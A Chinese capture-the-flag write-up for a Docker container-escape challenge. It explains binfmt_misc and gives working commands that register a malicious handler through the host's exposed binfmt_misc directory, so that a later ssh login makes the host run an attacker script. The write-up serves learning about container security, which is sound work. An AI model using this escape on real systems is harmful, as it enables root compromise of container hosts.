## About

这是2023年第五届RWCTF体验赛的容器逃逸的其中一个题目

## Description of the challenge

`nc 47.98.99.193 7777 `

[attachment](https://rwctf-eval-attachment.oss-cn-hangzhou.aliyuncs.com/Be-a-Docker-Escaper-2_70189456877f33cf3e6ca938b5cdf82f.zip) 

## Weriteup

该题目的思路来自于一篇 [slide][1] , 选手通过 ssh 获取题目 shell 后， 可以发现是在容器环境中。 仔细看根目录可以看到容器环境将 HOST 的 /proc/sys/fs/binfmt_misc/ 目录映射到了容器的 /binfmt_misc。

通过了解资料知道 Linux内核有一个名为Miscellaneous Binary Format（binfmt_misc）的机制，可以通过要打开文件的特性来选择到底使用哪个程序来打开。这种机制可以通过文件的扩展名或文件开始位置的特殊的字节（Magic Byte）来判断应该如何打开文件。

其 binfmt 的格式如下：

```
name:type:offset:magic:mask:interpreter:flags
```

这个配置中每个字段都用冒号 : 分割，某些字段拥有默认值可以跳过，但是必须保留相应的冒号分割符。
各个字段的意义如下：

● name：规则名
● type：表示如何匹配被打开的文件，值为 E 或 M 。E 表示根据扩展名识别，而 M 表示根据文件特定位置的Magic Bytes来识别
● offset：type字段设置成 M 之后有效，表示查找Magic Bytes的偏移，默认为0
● magic：表示要匹配的Magic Bytes，type字段为 M 时，表示文件的扩展名，扩展名是大小写敏感的，不需要包含 .。type字段为 E 时，表示Magic Bytes，其中不可见字符可以通过 \xff 的方式来输出
● mask：type字段设置成 M 之后有效，长度与Magic Bytes的长度一致。如果某一位为1，表magic对应的位匹配，为0则忽略。默认为全部匹配
● interpreter：启动文件的程序，需要是绝对路径
● flags: 可选字段，控制interpreter打开文件的行为。共支持 POCF 四种flag。

因此我们可以注册一个自己的 binfmt， 然后让其 HOST 执行相应的文件，就可以完成逃逸。关键是如何在 HOST 执行相应的文件。观察出题人给的条件,  出题人给了 ssh 登陆的途径。
我们通过 strace sshd 进程  ， 我们会发现 sshd 服务当有 ssh 尝试连接的时候会执行一些 bash 脚本，例如`etc/update-motd.d/00-header`

![img](https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-02-56039af0e5542900724814fd7490e4b0-6fc748.png)

可以看到这个文件是个 bash 脚本

![img](https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-02-610c82deef5bb44b4a23f4875da793ad-eb7859.png)

至此打通了逃逸的路径, 完整利用过程：

1. 首先注册一个自己的 binfmt

```bash
echo ":test:M::\x23\x21\x2f\x62\x69\x6e\x2f\x73\x68::/var/lib/docker/overlay2/$overlay/diff/tmp/exploit:" > /binfmt_misc/register 
```

例如上一条语句，即为注册一个名 test， magic 为 `#!/bin/sh` , interpreter位于 `/var/lib/docker/overlay2/$overlay/diff/tmp/exploit` 的 binfmt ，其中 `overlay2` 我们可以在 docker 中使用  mount 命令来获取

2. 往 `/var/lib/docker/overlay2/$overlay/diff/tmp/exploit` 写入我们要执行的命令

```bash
echo '#!/bin/bash' > /tmp/exploit
echo "docker cp /root/flag $container:/tmp/" >> /tmp/exploit
chmod 777 /tmp/exploit
```

3. 最后再使用 ssh 登陆一次即可获取 flag

## Deploy

题目部署脚本相关可以参考 [deploy][2] 文件夹


## Reference Link

[1]: https://github.com/knownsec/KCon/blob/master/2021/Container%20escape%20in%202021.pdf	"Container escape in 2021"
[2]: ./deploy	"题目部署脚本"